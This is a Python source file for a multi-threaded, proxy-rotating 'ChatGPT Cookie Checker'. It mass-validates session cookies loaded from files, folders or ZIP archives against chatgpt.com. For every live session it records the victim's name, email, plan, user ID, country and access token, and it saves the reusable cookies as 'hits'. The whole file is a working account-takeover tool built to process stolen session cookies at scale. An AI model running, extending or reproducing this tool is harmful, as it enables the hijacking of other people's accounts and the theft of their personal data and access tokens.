import requests
import json
import re
import time
import sys
import os
import zipfile
import threading
import queue
from datetime import datetime
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
WHITE = '\033[97m'
MAGENTA = '\033[95m'
BOLD = '\033[1m'
DIM = '\033[2m'
RESET = '\033[0m'

lock = threading.Lock()
save_lock = threading.Lock()

hits = 0
bad = 0
unknown = 0
errs = 0
total = 0
checked = 0
start_time = None
running = True

seen = set()
proxies = []
px_idx = 0
px_lock = threading.Lock()
use_px = False
dead_px = set()
rd = {}

BANNER = f"""
{BOLD}{RED}
   ███████╗██╗   ██╗██╗  ██╗██╗   ██╗███╗   ██╗ █████╗
   ██╔════╝██║   ██║██║ ██╔╝██║   ██║████╗  ██║██╔══██╗
   ███████╗██║   ██║█████╔╝ ██║   ██║██╔██╗ ██║███████║
   ╚════██║██║   ██║██╔═██╗ ██║   ██║██║╚██╗██║██╔══██║
   ███████║╚██████╔╝██║  ██╗╚██████╔╝██║ ╚████║██║  ██║
   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝{RESET}
{BOLD}{WHITE}   ╔═══════════════════════════════════════════════════╗
   ║{CYAN}   ChatGPT Cookie Checker{WHITE}  │  {MAGENTA}Owner: @RBX404{WHITE}      ║
   ║{DIM}{WHITE}   Mass Check │ Proxy Support │ Multi-Threaded{RESET}{BOLD}{WHITE}    ║
   ╚═══════════════════════════════════════════════════╝{RESET}
"""


def load_proxies_from_file(path):
    global proxies
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.read().strip().split('\n')
        px = []
        for line in lines:
            line = line.strip()
            if not line:
                continue
            p = line.split(':')
            if len(p) == 4:
                px.append(f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}")
            elif len(p) == 2:
                px.append(f"http://{p[0]}:{p[1]}")
            elif line.startswith('http'):
                px.append(line)
        proxies = px
        print(f"  {GREEN}✅ Loaded {len(proxies)} proxies{RESET}")
        return len(proxies) > 0
    except Exception as e:
        print(f"  {RED}❌ Proxy file error: {e}{RESET}")
        return False


def load_proxies_from_url(url):
    global proxies
    print(f"  {YELLOW}⏳ Fetching proxies from URL...{RESET}")
    try:
        r = requests.get(url, timeout=15)
        if r.status_code != 200:
            print(f"  {RED}❌ Proxy fetch failed (HTTP {r.status_code}){RESET}")
            return False
        px = []
        for line in r.text.strip().split('\n'):
            line = line.strip()
            if not line:
                continue
            p = line.split(':')
            if len(p) == 4:
                px.append(f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}")
            elif len(p) == 2:
                px.append(f"http://{p[0]}:{p[1]}")
            elif line.startswith('http'):
                px.append(line)
        proxies = px
        print(f"  {GREEN}✅ Loaded {len(proxies)} proxies{RESET}")
        return len(proxies) > 0
    except Exception as e:
        print(f"  {RED}❌ Proxy error: {e}{RESET}")
        return False


def next_px():
    global px_idx
    if not proxies:
        return None
    with px_lock:
        attempts = 0
        max_attempts = len(proxies) * 2
        while attempts < max_attempts:
            p = proxies[px_idx % len(proxies)]
            px_idx += 1
            attempts += 1
            if p not in dead_px:
                return {"http": p, "https": p}
        if dead_px:
            dead_px.clear()
        p = proxies[px_idx % len(proxies)]
        px_idx += 1
        return {"http": p, "https": p}


def do_get(url, cookies=None, headers=None, timeout=15):
    max_retries = 3
    for attempt in range(max_retries):
        if not running:
            return None
        px = next_px() if use_px else None
        try:
            r = requests.get(
                url,
                cookies=cookies,
                headers=headers,
                proxies=px,
                timeout=(8, timeout),
                allow_redirects=True,
                verify=False
            )
            return r
        except requests.exceptions.ProxyError:
            if px:
                with px_lock:
                    dead_px.add(px.get('http', ''))
        except:
            time.sleep(0.3)
    return None


def parse_cookies(text):
    text = text.strip()
    if not text:
        return {}

    try:
        if text.startswith('[') or text.startswith('{'):
            data = json.loads(text)
            if isinstance(data, list):
                cookies = {}
                for item in data:
                    if isinstance(item, dict):
                        name = item.get("name", item.get("Name", ""))
                        value = item.get("value", item.get("Value", ""))
                        if name and value:
                            cookies[name] = value
                if cookies:
                    return cookies
            elif isinstance(data, dict):
                return {str(k): str(v) for k, v in data.items()}
    except:
        pass

    cookies = {}
    for line in text.split('\n'):
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split('\t')
        if len(parts) >= 7:
            name = parts[5].strip()
            value = parts[6].strip()
            if name:
                cookies[name] = value
            continue
        if '=' in line and not line.startswith('http'):
            kv = line.split('=', 1)
            if len(kv) == 2:
                name = kv[0].strip().strip('"')
                value = kv[1].strip().strip(';').strip('"')
                if name and len(name) > 1:
                    cookies[name] = value
    return cookies


def rebuild_netscape(cookies_dict):
    lines = ["# Netscape HTTP Cookie File"]
    lines.append("# ChatGPT Cookies - RBX404 Checker | Owner: @RBX404")
    lines.append("")
    for name, value in cookies_dict.items():
        secure = "TRUE" if name.startswith("__Secure") or name.startswith("__Host") else "FALSE"
        lines.append(f".chatgpt.com\tTRUE\t/\t{secure}\t0\t{name}\t{value}")
    return "\n".join(lines)


def check_chatgpt(cookies_dict):
    headers = {
        "authority": "chatgpt.com",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    }

    r = do_get("https://chatgpt.com/", cookies=cookies_dict, headers=headers, timeout=20)

    if r is None:
        return None, "error"

    if r.status_code != 200:
        return None, "error"

    if "login" in r.url.lower() or "auth0" in r.url.lower():
        return None, "expired"

    data = r.text

    scripts = re.findall(
        r'<script[^>]*id="client-bootstrap"[^>]*>(.*?)</script>',
        data,
        re.DOTALL,
    )

    for script in scripts:
        try:
            js = json.loads(script)
            if js.get("authStatus") == "logged_in":
                user = js.get("session", {}).get("user", {})
                account = js.get("session", {}).get("account", {})
                session = js.get("session", {})

                name = user.get("name", "N/A")
                email = user.get("email", "N/A")
                image = user.get("image", "N/A")
                user_id = user.get("id", "N/A")
                plan = account.get("planType", "N/A")
                expires = session.get("expires", "N/A")
                access_token = session.get("accessToken", "N/A")

                if plan and plan.lower() != "free" and plan != "N/A":
                    is_paid = True
                else:
                    is_paid = False

                features = account.get("features", [])
                entitlement = account.get("entitlement", {})
                rate_limits = account.get("rate_limits", [])

                country = "N/A"
                try:
                    import urllib.parse
                    client_info = cookies_dict.get("oai-client-auth-info", "")
                    if client_info:
                        decoded = urllib.parse.unquote(client_info)
                        ci = json.loads(decoded)
                        country = ci.get("country", "N/A")
                except:
                    pass

                result = {
                    "name": name,
                    "email": email,
                    "image": image,
                    "user_id": user_id,
                    "plan": plan,
                    "is_paid": is_paid,
                    "expires": expires,
                    "access_token": access_token,
                    "features": features,
                    "entitlement": entitlement,
                    "rate_limits": rate_limits,
                    "country": country,
                }
                return result, "valid"

        except (json.JSONDecodeError, KeyError, TypeError):
            continue

    if "logged_in" in data:
        email_match = re.search(r'"email"\s*:\s*"([^"]+)"', data)
        plan_match = re.search(r'"planType"\s*:\s*"([^"]+)"', data)
        name_match = re.search(r'"name"\s*:\s*"([^"]+)"', data)

        if email_match:
            email = email_match.group(1)
            plan = plan_match.group(1) if plan_match else "N/A"
            name = name_match.group(1) if name_match else "N/A"

            if plan and plan.lower() != "free" and plan != "N/A":
                is_paid = True
            else:
                is_paid = False

            result = {
                "name": name,
                "email": email,
                "image": "N/A",
                "user_id": "N/A",
                "plan": plan,
                "is_paid": is_paid,
                "expires": "N/A",
                "access_token": "N/A",
                "features": [],
                "entitlement": {},
                "rate_limits": [],
                "country": "N/A",
            }
            return result, "valid"

    return None, "expired"


def save_hit(info, cookies_dict, source_file):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    plan = info.get("plan", "unknown").lower()
    email = info.get("email", "unknown")

    safe_email = re.sub(r'[<>:"/\\|?*]', '_', email)
    safe_plan = re.sub(r'[<>:"/\\|?*]', '_', plan)

    filename = f"[{safe_plan}][{safe_email}].txt"

    netscape = rebuild_netscape(cookies_dict)

    token_display = info.get("access_token", "N/A")
    if token_display and token_display != "N/A" and len(token_display) > 80:
        token_short = token_display[:40] + "..." + token_display[-40:]
    else:
        token_short = token_display

    features_str = ""
    if info.get("features"):
        for feat in info["features"]:
            features_str += f"  - {feat}\n"

    rate_str = ""
    if info.get("rate_limits"):
        for rl in info["rate_limits"]:
            model = rl.get("model", "unknown")
            limit = rl.get("limit", "?")
            window = rl.get("window", "?")
            rate_str += f"  - {model}: {limit} per {window}s\n"

    entitlement_str = ""
    if info.get("entitlement"):
        for k, v in info["entitlement"].items():
            entitlement_str += f"  - {k}: {v}\n"

    content = f"""════════════════════════════════════════════════════════
  RBX404 ChatGPT Cookie Checker
  Owner: @RBX404
════════════════════════════════════════════════════════

- Checked At : {timestamp}
- Source     : {source_file}

════════════════════════════════════════════════════════
  ACCOUNT INFO
════════════════════════════════════════════════════════

- Name       : {info.get("name", "N/A")}
- Email      : {info.get("email", "N/A")}
- Plan       : {info.get("plan", "N/A")}
- Paid       : {info.get("is_paid", False)}
- User ID    : {info.get("user_id", "N/A")}
- Country    : {info.get("country", "N/A")}
- Expires    : {info.get("expires", "N/A")}
- Token      : {token_short}

"""

    if features_str:
        content += f"""════════════════════════════════════════════════════════
  FEATURES
════════════════════════════════════════════════════════
{features_str}
"""

    if rate_str:
        content += f"""════════════════════════════════════════════════════════
  RATE LIMITS
════════════════════════════════════════════════════════
{rate_str}
"""

    if entitlement_str:
        content += f"""════════════════════════════════════════════════════════
  ENTITLEMENT
════════════════════════════════════════════════════════
{entitlement_str}
"""

    content += f"""════════════════════════════════════════════════════════
  COOKIES (Netscape Format)
════════════════════════════════════════════════════════
{netscape}

════════════════════════════════════════════════════════
  RAW COOKIES (JSON)
════════════════════════════════════════════════════════
{json.dumps(cookies_dict, indent=2, ensure_ascii=False)}

════════════════════════════════════════════════════════
  Owner: @RBX404 | RBX404 ChatGPT Cookie Checker
════════════════════════════════════════════════════════
"""

    filepath = os.path.join(rd['hits'], filename)

    counter = 1
    while os.path.exists(filepath):
        name_part = f"[{safe_plan}][{safe_email}]_{counter}.txt"
        filepath = os.path.join(rd['hits'], name_part)
        counter += 1

    with save_lock:
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(content)


def process_cookie(filename, cookie_text):
    global hits, bad, unknown, errs, checked

    cookies_dict = parse_cookies(cookie_text)
    if not cookies_dict:
        with lock:
            bad += 1
            checked += 1
        return

    has_session = any(
        k in cookies_dict for k in [
            '__Secure-next-auth.session-token',
            '__Secure-next-auth.session-token.0',
            'oai-sc',
            '__Secure-next-auth.session-token.1'
        ]
    )

    if not has_session:
        with lock:
            bad += 1
            checked += 1
        return

    uid_parts = []
    for key in sorted(cookies_dict.keys()):
        if 'session' in key.lower() or key == 'oai-sc':
            uid_parts.append(cookies_dict[key][:50])
    uid = "|".join(uid_parts)

    with save_lock:
        if uid in seen:
            with lock:
                checked += 1
            return
        seen.add(uid)

    info, status = check_chatgpt(cookies_dict)

    if status == "expired":
        with lock:
            bad += 1
            checked += 1
        return

    if status == "error" or not info:
        with lock:
            unknown += 1
            checked += 1
        return

    with lock:
        hits += 1
        checked += 1
        hit_num = hits

    save_hit(info, cookies_dict, filename)

    plan_val = info.get("plan", "?")
    email_val = info.get("email", "?")
    paid_tag = f"{GREEN}PAID{RESET}" if info.get("is_paid") else f"{YELLOW}FREE{RESET}"

    print(f"\n  {GREEN}🔥 HIT #{hit_num}{RESET} │ {WHITE}[{plan_val}]{RESET} │ {paid_tag} │ {CYAN}{email_val}{RESET} │ {DIM}{filename}{RESET}")


def worker(q):
    while running:
        try:
            filename, cookie_text = q.get(timeout=1)
        except queue.Empty:
            return
        except:
            return
        try:
            process_cookie(filename, cookie_text)
        except:
            with lock:
                global errs, checked
                errs += 1
                checked += 1
        finally:
            q.task_done()


def load_files(path):
    files = []

    if not os.path.exists(path):
        print(f"  {RED}❌ Path not found{RESET}")
        return files

    if path.lower().endswith('.zip'):
        print(f"  {YELLOW}⏳ Loading ZIP file...{RESET}")
        try:
            with zipfile.ZipFile(path, 'r') as zf:
                for name in zf.namelist():
                    if name.lower().endswith('.txt') and '__MACOSX' not in name:
                        try:
                            content = zf.read(name).decode('utf-8', errors='ignore')
                            if content.strip():
                                files.append((name, content))
                        except:
                            pass
        except Exception as e:
            print(f"  {RED}❌ ZIP error: {e}{RESET}")

    elif os.path.isdir(path):
        print(f"  {YELLOW}⏳ Loading directory...{RESET}")
        for root, _, filenames in os.walk(path):
            for fn in filenames:
                if fn.endswith('.txt'):
                    filepath = os.path.join(root, fn)
                    try:
                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                        if content.strip():
                            rel_path = os.path.relpath(filepath, path)
                            files.append((rel_path, content))
                    except:
                        pass

    elif os.path.isfile(path):
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            if content.strip():
                files.append((os.path.basename(path), content))
        except:
            pass

    print(f"  {GREEN}✅ Loaded {len(files)} cookie files{RESET}")
    return files


def display_status():
    if start_time is None:
        return
    elapsed = time.time() - start_time
    cpm = int((checked / elapsed) * 60) if elapsed > 0 else 0
    percent = (checked / total * 100) if total > 0 else 0

    bar_len = 20
    filled = int(bar_len * checked / total) if total > 0 else 0
    bar = f"{GREEN}{'█' * filled}{DIM}{'░' * (bar_len - filled)}{RESET}"

    status = (
        f"\r  {WHITE}[{bar}{WHITE}] "
        f"{GREEN}Hits:{hits}{WHITE} │ "
        f"{RED}Bad:{bad}{WHITE} │ "
        f"{YELLOW}Unk:{unknown}{WHITE} │ "
        f"{BLUE}{checked}/{total} ({percent:.1f}%){WHITE} │ "
        f"{CYAN}{cpm} cpm{WHITE} │ "
        f"{DIM}{elapsed:.0f}s{RESET}   "
    )
    sys.stdout.write(status)
    sys.stdout.flush()


def mass_checker():
    global hits, bad, unknown, errs, total, checked, start_time, running, rd, use_px, proxies

    print(f"\n  {BOLD}{BLUE}━━━ MASS CHECKER MODE ━━━{RESET}\n")

    path = input(f"  {WHITE}[?] Path (file/folder/zip): {RESET}").strip().strip('"\'')
    if not path:
        print(f"  {RED}❌ No path provided{RESET}")
        return

    files = load_files(path)
    if not files:
        print(f"  {RED}❌ No cookie files found{RESET}")
        return

    total = len(files)

    print()
    proxy_choice = input(f"  {WHITE}[?] Use proxies? (y/n) [n]: {RESET}").strip().lower()
    if proxy_choice in ('y', 'yes'):
        print()
        print(f"  {WHITE}[1] Load from file{RESET}")
        print(f"  {WHITE}[2] Load from URL{RESET}")
        print(f"  {WHITE}[3] Enter manually{RESET}")
        print()
        px_method = input(f"  {WHITE}[?] Choose: {RESET}").strip()

        if px_method == '1':
            px_path = input(f"  {WHITE}[?] Proxy file path: {RESET}").strip().strip('"\'')
            if px_path and load_proxies_from_file(px_path):
                use_px = True
        elif px_method == '2':
            px_url = input(f"  {WHITE}[?] Proxy URL: {RESET}").strip()
            if px_url and load_proxies_from_url(px_url):
                use_px = True
        elif px_method == '3':
            print(f"  {WHITE}[?] Paste proxies (ip:port or ip:port:user:pass), Enter twice when done:{RESET}")
            px_lines = []
            empty_c = 0
            while True:
                try:
                    line = input()
                except EOFError:
                    break
                if not line.strip():
                    empty_c += 1
                    if empty_c >= 2:
                        break
                else:
                    empty_c = 0
                    px_lines.append(line.strip())

            px = []
            for line in px_lines:
                p = line.split(':')
                if len(p) == 4:
                    px.append(f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}")
                elif len(p) == 2:
                    px.append(f"http://{p[0]}:{p[1]}")
                elif line.startswith('http'):
                    px.append(line)

            if px:
                proxies = px
                use_px = True
                print(f"  {GREEN}✅ Loaded {len(proxies)} proxies{RESET}")

        if not use_px:
            print(f"  {YELLOW}⚠ Continuing without proxies{RESET}")

    print()
    while True:
        try:
            thread_input = input(f"  {WHITE}[?] Threads (1-50) [10]: {RESET}").strip()
            threads = int(thread_input) if thread_input else 10
            if 1 <= threads <= 50:
                break
            print(f"  {RED}❌ Enter 1-50{RESET}")
        except:
            print(f"  {RED}❌ Invalid input{RESET}")

    results_dir = "RBX404_results"
    os.makedirs(results_dir, exist_ok=True)

    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    run_dir = os.path.join(results_dir, f"check_{timestamp}")
    os.makedirs(run_dir, exist_ok=True)

    rd = {
        'hits': os.path.join(run_dir, 'hits'),
    }

    for dir_path in rd.values():
        os.makedirs(dir_path, exist_ok=True)

    print(f"\n  {GREEN}✅ Results: {run_dir}{RESET}")
    print(f"  {CYAN}✅ Format: [plan][email].txt{RESET}")
    time.sleep(1)

    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)
    print(f"  {WHITE}Files: {CYAN}{total}{WHITE} │ Threads: {CYAN}{threads}{WHITE} │ Proxies: {CYAN}{len(proxies) if use_px else 0}{RESET}")
    print(f"  {WHITE}Output: {CYAN}{run_dir}{RESET}")
    print(f"  {DIM}{'─' * 56}{RESET}\n")

    hits = bad = unknown = errs = checked = 0
    running = True

    file_queue = queue.Queue()
    for item in files:
        file_queue.put(item)

    start_time = time.time()

    workers = []
    for _ in range(threads):
        t = threading.Thread(target=worker, args=(file_queue,), daemon=True)
        t.start()
        workers.append(t)

    try:
        while True:
            display_status()
            time.sleep(0.5)

            if file_queue.empty():
                all_done = True
                for t in workers:
                    if t.is_alive():
                        all_done = False
                        break
                if all_done:
                    break
                time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n  {YELLOW}⚠ Stopping...{RESET}")
        running = False
        time.sleep(2)

    display_status()

    elapsed = time.time() - start_time
    cpm = int((checked / elapsed) * 60) if elapsed > 0 else 0
    hit_rate = (hits / checked * 100) if checked > 0 else 0
    hit_count = len(os.listdir(rd['hits'])) if os.path.exists(rd['hits']) else 0

    print(f"\n\n  {BOLD}{WHITE}{'═' * 50}{RESET}")
    print(f"  {BOLD}{GREEN}  COMPLETED ✅{RESET}")
    print(f"  {BOLD}{WHITE}{'═' * 50}{RESET}")
    print(f"  {GREEN}  Hits       : {hits}{RESET}")
    print(f"  {RED}  Bad        : {bad}{RESET}")
    print(f"  {YELLOW}  Unknown    : {unknown}{RESET}")
    print(f"  {WHITE}  Errors     : {errs}{RESET}")
    print(f"  {BLUE}  Checked    : {checked}/{total}{RESET}")
    print(f"  {CYAN}  Hit Rate   : {hit_rate:.2f}%{RESET}")
    print(f"  {WHITE}  Speed      : {cpm} CPM{RESET}")
    print(f"  {WHITE}  Time       : {elapsed:.0f}s{RESET}")
    print(f"  {BOLD}{WHITE}{'═' * 50}{RESET}")
    print(f"  {GREEN}  Saved {hit_count} hits to: {rd['hits']}{RESET}")
    print(f"  {MAGENTA}  Owner: @RBX404{RESET}")
    print(f"  {BOLD}{WHITE}{'═' * 50}{RESET}\n")


def single_check():
    print(f"\n  {BOLD}{BLUE}━━━ SINGLE CHECK MODE ━━━{RESET}")
    print(f"  {WHITE}Paste cookies (Netscape/JSON), press Enter twice when done:{RESET}\n")

    lines = []
    empty_count = 0

    while True:
        try:
            line = input()
        except EOFError:
            break
        if not line.strip():
            empty_count += 1
            if empty_count >= 2:
                break
            lines.append(line)
        else:
            empty_count = 0
            lines.append(line)

    cookie_text = '\n'.join(lines)
    if not cookie_text.strip():
        print(f"  {RED}❌ No input provided{RESET}")
        return

    cookies_dict = parse_cookies(cookie_text)
    if not cookies_dict:
        print(f"  {RED}❌ Failed to parse cookies{RESET}")
        return

    print(f"  {GREEN}✅ Parsed {len(cookies_dict)} cookies{RESET}")
    print()

    proxy_choice = input(f"  {WHITE}[?] Use proxies? (y/n) [n]: {RESET}").strip().lower()
    if proxy_choice in ('y', 'yes'):
        px_path = input(f"  {WHITE}[?] Proxy file path (or URL): {RESET}").strip().strip('"\'')
        if px_path:
            global use_px
            if px_path.startswith('http'):
                if load_proxies_from_url(px_path):
                    use_px = True
            else:
                if load_proxies_from_file(px_path):
                    use_px = True

    print(f"\n  {YELLOW}⏳ Verifying cookies...{RESET}\n")

    info, status = check_chatgpt(cookies_dict)

    if status == "expired":
        print(f"  {RED}❌ Cookies are expired or invalid{RESET}\n")
        return
    elif status == "error" or not info:
        print(f"  {YELLOW}❌ Failed to check (network error or blocked){RESET}\n")
        return

    print(f"  {GREEN}✅ Valid account found!{RESET}\n")

    plan_val = info.get("plan", "N/A")

    print(f"  ╔══════════════════════════════════════════════════════╗")
    print(f"  ║  {BOLD}{GREEN}🔥 ACCOUNT FOUND{RESET}                                   ║")
    print(f"  ╠══════════════════════════════════════════════════════╣")
    print(f"  ║  {WHITE}Name    :{RESET} {info.get('name', 'N/A'):<42}║")
    print(f"  ║  {WHITE}Email   :{RESET} {info.get('email', 'N/A'):<42}║")
    print(f"  ║  {WHITE}Plan    :{RESET} {plan_val:<42}║")
    print(f"  ║  {WHITE}Paid    :{RESET} {'True' if info.get('is_paid') else 'False':<42}║")
    print(f"  ║  {WHITE}User ID :{RESET} {info.get('user_id', 'N/A'):<42}║")
    print(f"  ║  {WHITE}Country :{RESET} {info.get('country', 'N/A'):<42}║")
    print(f"  ║  {WHITE}Expires :{RESET} {info.get('expires', 'N/A'):<42}║")
    print(f"  ╠══════════════════════════════════════════════════════╣")

    if info.get("features"):
        print(f"  ║  {CYAN}Features:{RESET}                                            ║")
        for feat in info["features"][:10]:
            display_feat = str(feat)[:46]
            print(f"  ║    {DIM}• {display_feat:<46}{RESET}  ║")
        if len(info["features"]) > 10:
            rem = len(info["features"]) - 10
            rem_str = str(rem)
            padding = 39 - len(rem_str)
            print(f"  ║    {DIM}... and {rem_str} more{RESET}{' ' * padding}║")

    print(f"  ╠══════════════════════════════════════════════════════╣")

    token = info.get("access_token", "N/A")
    if token and token != "N/A" and len(token) > 42:
        token_short = token[:18] + "..." + token[-18:]
    else:
        token_short = token
    print(f"  ║  {WHITE}Token  :{RESET} {token_short:<43}║")

    print(f"  ╠══════════════════════════════════════════════════════╣")
    print(f"  ║  {MAGENTA}Owner: @RBX404{RESET}                                      ║")
    print(f"  ╚══════════════════════════════════════════════════════╝")
    print()

    save_choice = input(f"  {WHITE}[?] Save to file? (y/n) [y]: {RESET}").strip().lower()
    if save_choice != 'n':
        safe_email = re.sub(r'[<>:"/\\|?*]', '_', info.get('email', 'unknown'))
        safe_plan = re.sub(r'[<>:"/\\|?*]', '_', plan_val.lower())
        filename = f"[{safe_plan}][{safe_email}].txt"

        os.makedirs("RBX404_results", exist_ok=True)

        netscape = rebuild_netscape(cookies_dict)

        token_display = info.get("access_token", "N/A")
        if token_display and token_display != "N/A" and len(token_display) > 80:
            t_short = token_display[:40] + "..." + token_display[-40:]
        else:
            t_short = token_display

        content = f"""════════════════════════════════════════════════════════
  RBX404 ChatGPT Cookie Checker
  Owner: @RBX404
════════════════════════════════════════════════════════

- Checked At : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

════════════════════════════════════════════════════════
  ACCOUNT INFO
════════════════════════════════════════════════════════

- Name       : {info.get("name", "N/A")}
- Email      : {info.get("email", "N/A")}
- Plan       : {plan_val}
- Paid       : {info.get("is_paid", False)}
- User ID    : {info.get("user_id", "N/A")}
- Country    : {info.get("country", "N/A")}
- Expires    : {info.get("expires", "N/A")}
- Token      : {t_short}

════════════════════════════════════════════════════════
  COOKIES (Netscape Format)
════════════════════════════════════════════════════════
{netscape}

════════════════════════════════════════════════════════
  RAW COOKIES (JSON)
════════════════════════════════════════════════════════
{json.dumps(cookies_dict, indent=2, ensure_ascii=False)}

════════════════════════════════════════════════════════
  Owner: @RBX404 | RBX404 ChatGPT Cookie Checker
════════════════════════════════════════════════════════
"""

        filepath = os.path.join("RBX404_results", filename)
        counter = 1
        while os.path.exists(filepath):
            name_part = f"[{safe_plan}][{safe_email}]_{counter}.txt"
            filepath = os.path.join("RBX404_results", name_part)
            counter += 1

        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(content)

        print(f"\n  {GREEN}✅ Saved to: {filepath}{RESET}\n")


def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)

    print(f"  {WHITE}[{GREEN}1{WHITE}] Single Check{RESET}")
    print(f"  {WHITE}[{BLUE}2{WHITE}] Mass Checker{RESET}")
    print(f"  {WHITE}[{RED}0{WHITE}] Exit{RESET}")
    print()

    while True:
        choice = input(f"  {WHITE}[?] Choose: {RESET}").strip()

        if choice == '1':
            single_check()
            break
        elif choice == '2':
            mass_checker()
            break
        elif choice == '0':
            print(f"\n  {GREEN}Goodbye! {MAGENTA}@RBX404{RESET}\n")
            sys.exit(0)
        else:
            print(f"  {RED}❌ Invalid choice{RESET}")


if __name__ == '__main__':
    main()
